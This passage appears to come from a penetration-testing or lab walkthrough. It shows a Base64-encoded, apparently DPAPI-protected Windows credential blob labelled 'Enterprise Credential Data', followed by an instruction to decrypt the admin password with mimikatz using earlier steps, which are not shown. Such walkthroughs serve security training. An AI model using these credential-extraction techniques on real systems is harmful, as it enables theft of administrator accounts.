AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQA
AIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIe
tbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfR
r1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocg
qCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ==
```

Now you got your Base64. Now follow the same steps that we've followed above to decrypt the admin password using mimikatz.

